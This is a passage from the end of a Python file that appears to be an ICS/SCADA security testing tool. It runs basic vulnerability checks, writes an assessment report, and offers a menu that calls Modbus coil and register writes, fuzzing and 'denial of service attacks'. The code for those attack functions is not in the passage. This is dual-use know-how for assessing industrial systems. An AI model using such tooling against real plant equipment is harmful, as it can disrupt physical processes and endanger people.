            if results['crashes_detected'] > 0:
                print(f"{Colors.ERROR}    ⚠️  Potential crashes detected: {results['crashes_detected']}")
        
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
    
    def vulnerability_assessment(self):
        """Comprehensive vulnerability assessment"""
        if not self.discovered_devices:
            print(f"{Colors.WARNING}  No devices available. Run device discovery first.")
            return
        
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] SCADA Vulnerability Assessment")
        
        vulnerabilities_found = 0
        
        for device in self.discovered_devices:
            print(f"\n{Colors.BLUE}  Assessing {device.ip}:{device.port} ({device.protocol})")
            
            device_vulns = []
            
            # Check for common vulnerabilities
            
            # 1. Default credentials
            if "Modbus" in device.protocol:
                print(f"{Colors.YELLOW}    Checking for default Modbus configuration...")
                if device.port == 502:
                    device_vulns.append("Default Modbus port (502) - consider changing")
            
            # 2. Unencrypted communication
            if device.port in [502, 102, 44818]:  # Common unencrypted industrial ports
                device_vulns.append("Unencrypted industrial protocol")
                print(f"{Colors.WARNING}    ⚠️  Unencrypted communication detected")
            
            # 3. Unauthorized access
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2.0)
                result = sock.connect_ex((device.ip, device.port))
                sock.close()
                
                if result == 0:
                    device_vulns.append("No authentication required for connection")
                    print(f"{Colors.ERROR}    ⚠️  No connection authentication")
            except:
                pass
            
            # 4. Information disclosure
            if device.manufacturer != "Unknown" or device.firmware_version != "Unknown":
                device_vulns.append("Device information disclosure")
                print(f"{Colors.WARNING}    ⚠️  Device information disclosed")
            
            # 5. Protocol-specific checks
            if "Modbus" in device.protocol:
                # Check for unrestricted register access
                if device.registers:
                    device_vulns.append("Unrestricted register read access")
                    print(f"{Colors.WARNING}    ⚠️  Unrestricted register access")
            
            # Store vulnerabilities
            device.vulnerabilities = device_vulns
            vulnerabilities_found += len(device_vulns)
            
            if device_vulns:
                print(f"{Colors.RED}    Found {len(device_vulns)} vulnerabilities:")
                for vuln in device_vulns:
                    print(f"{Colors.CYAN}      • {vuln}")
            else:
                print(f"{Colors.GREEN}    No obvious vulnerabilities detected")
        
        print(f"\n{Colors.MAGENTA}  Assessment Summary:")
        print(f"{Colors.INFO}    Devices assessed: {len(self.discovered_devices)}")
        print(f"{Colors.INFO}    Total vulnerabilities: {vulnerabilities_found}")
        
        if vulnerabilities_found > 0:
            print(f"{Colors.ERROR}    ⚠️  Security improvements needed")
        else:
            print(f"{Colors.SUCCESS}    ✅ No obvious vulnerabilities found")
    
    def generate_report(self):
        """Generate SCADA security assessment report"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] SCADA Security Assessment Report")
        
        if not self.discovered_devices:
            print(f"{Colors.WARNING}  No assessment data available. Perform scans first.")
            return
        
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        report_file = os.path.join("reports", f"scada_security_report_{timestamp}.txt")
        
        try:
            os.makedirs("reports", exist_ok=True)
            
            with open(report_file, 'w') as f:
                f.write("===============================================\n")
                f.write("  SCADA/ICS SECURITY ASSESSMENT REPORT\n")
                f.write("===============================================\n\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Assessor: {Config.APP_NAME} v{Config.VERSION}\n")
                f.write(f"Environment: {Config.CURRENT_PLATFORM}\n\n")
                
                f.write("DISCOVERED INDUSTRIAL DEVICES\n")
                f.write("=============================\n\n")
                
                for i, device in enumerate(self.discovered_devices, 1):
                    f.write(f"[{i}] Device: {device.ip}:{device.port}\n")
                    f.write(f"    Protocol: {device.protocol}\n")
                    f.write(f"    Type: {device.device_type}\n")
                    f.write(f"    Manufacturer: {device.manufacturer}\n")
                    f.write(f"    Firmware: {device.firmware_version}\n")
                    
                    if device.registers:
                        f.write(f"    Registers accessible: {len(device.registers)}\n")
                    
                    if device.vulnerabilities:
                        f.write(f"    Vulnerabilities: {len(device.vulnerabilities)}\n")
                        for vuln in device.vulnerabilities:
                            f.write(f"      • {vuln}\n")
                    
                    f.write("\n")
                
                # Statistics
                total_devices = len(self.discovered_devices)
                modbus_devices = len([d for d in self.discovered_devices if "Modbus" in d.protocol])
                vulnerable_devices = len([d for d in self.discovered_devices if d.vulnerabilities])
                
                f.write("SECURITY STATISTICS\n")
                f.write("==================\n\n")
                f.write(f"Total devices: {total_devices}\n")
                f.write(f"Modbus devices: {modbus_devices}\n")
                f.write(f"Vulnerable devices: {vulnerable_devices}\n")
                f.write(f"Risk level: {'HIGH' if vulnerable_devices > total_devices * 0.5 else 'MEDIUM' if vulnerable_devices > 0 else 'LOW'}\n\n")
                
                f.write("SECURITY RECOMMENDATIONS\n")
                f.write("========================\n\n")
                f.write("1. Implement network segmentation for industrial networks\n")
                f.write("2. Use VPNs for remote access to SCADA systems\n")
                f.write("3. Enable authentication on all industrial devices\n")
                f.write("4. Regularly update firmware on industrial devices\n")
                f.write("5. Monitor network traffic for anomalies\n")
                f.write("6. Implement intrusion detection systems (IDS)\n")
                f.write("7. Use encrypted protocols where possible\n")
                f.write("8. Regular security audits and penetration testing\n")
                f.write("9. Implement proper access controls and role-based permissions\n")
                f.write("10. Maintain offline backups of critical configurations\n")
            
            print(f"{Colors.SUCCESS}  Report generated: {report_file}")
            
        except Exception as e:
            self.logger.error(f"Report generation error: {e}")
            print(f"{Colors.ERROR}  Report generation failed: {e}")
    
    def module_information(self):
        """Display module information"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}ℹ{Colors.CYAN}] SCADA/ICS Module Information")
        
        print(f"\n{Colors.MAGENTA}  Module Details:")
        print(f"{Colors.GREEN}    • Name: SCADA/ICS Security Testing Module")
        print(f"{Colors.GREEN}    • Version: 2.1")
        print(f"{Colors.GREEN}    • Author: Network(GHANA)")
        print(f"{Colors.GREEN}    • Purpose: Industrial control systems security assessment")
        
        print(f"\n{Colors.MAGENTA}  Capabilities:")
        print(f"{Colors.CYAN}    • Industrial device discovery")
        print(f"{Colors.CYAN}    • Modbus protocol analysis")
        print(f"{Colors.CYAN}    • Register and coil manipulation")
        print(f"{Colors.CYAN}    • Protocol fuzzing")
        print(f"{Colors.CYAN}    • Denial of service attacks")
        print(f"{Colors.CYAN}    • Vulnerability assessment")
        print(f"{Colors.CYAN}    • Security reporting")
        
        print(f"\n{Colors.MAGENTA}  Supported Protocols:")
        print(f"{Colors.YELLOW}    • Modbus TCP (Port 502)")
        print(f"{Colors.YELLOW}    • S7comm - Siemens (Port 102)")
        print(f"{Colors.YELLOW}    • EtherNet/IP - Allen-Bradley (Port 44818)")
        print(f"{Colors.YELLOW}    • DNP3 (Port 20000)")
        print(f"{Colors.YELLOW}    • IEC 61850 MMS (Port 2404)")
        
        print(f"\n{Colors.MAGENTA}  Safety Notice:")
        print(f"{Colors.ERROR}    ⚠️  Only use on authorized test systems")
        print(f"{Colors.ERROR}    ⚠️  Industrial attacks can cause physical damage")
        print(f"{Colors.ERROR}    ⚠️  Always coordinate with operations teams")
        
        print(f"\n{Colors.MAGENTA}  Status:")
        print(f"{Colors.INFO}    • Discovered devices: {len(self.discovered_devices)}")
        vulnerable_count = len([d for d in self.discovered_devices if d.vulnerabilities])
        print(f"{Colors.INFO}    • Vulnerable devices: {vulnerable_count}")
    
    def main(self):
        """Main SCADA module loop"""
        print(f"\n{Colors.ERROR}  ⚠️  INDUSTRIAL SYSTEMS SECURITY MODULE")
        print(f"{Colors.WARNING}  This module tests industrial control systems")
        print(f"{Colors.WARNING}  Only use on authorized test environments")
        print(f"{Colors.ERROR}  Attacks on production systems can cause physical damage!")
        
        confirm = input(f"\n{Colors.GREEN}  I understand the risks and have authorization ({Colors.CYAN}yes{Colors.GREEN}/{Colors.RED}no{Colors.GREEN}): {Colors.YELLOW}").strip().lower()
        if confirm != "yes":
            print(f"{Colors.INFO}  Module access denied")
            return
        
        try:
            while True:
                try:
                    SystemUtils.clear_screen()
                    self.show_menu()
                    choice = MenuRenderer.get_user_input(self.hostname)
                    
                    if choice == "0":
                        print(f"\n{Colors.MAGENTA} 🚪{Colors.YELLOW}Returning to main menu...")
                        break
                    elif choice == "1":
                        self.device_discovery()
                    elif choice == "2":
                        self.modbus_enumeration()
                    elif choice == "3":
                        self.register_reading()
                    elif choice == "4":
                        self.coil_manipulation()
                    elif choice == "5":
                        self.register_write()
                    elif choice == "6":
                        self.dos_attack()
                    elif choice == "7":
                        self.protocol_fuzzing()
                    elif choice == "8":
                        self.vulnerability_assessment()
                    elif choice == "9":
                        self.generate_report()
                    elif choice == "10":
                        self.module_information()
                    else:
                        print(f"\n{Colors.WARNING}'{choice}' is not a valid option!")
                    
                    if choice != "0":
                        input(f"\n  {Colors.GREEN}Press Enter to continue...")
                        
                except (KeyboardInterrupt, EOFError):
                    print(f"\n{Colors.MAGENTA} 🚪{Colors.YELLOW}Returning to main menu...")
                    break
                    
        except Exception as e:
            self.logger.error(f"SCADA module error: {e}", exc_info=True)
            print(f"{Colors.ERROR}Module error: {e}")

if __name__ == "__main__":
    try:
        scada_module = SCADAModule()
        scada_module.main()
    except Exception as e:
        print(f"{Colors.ERROR}Critical error: {e}")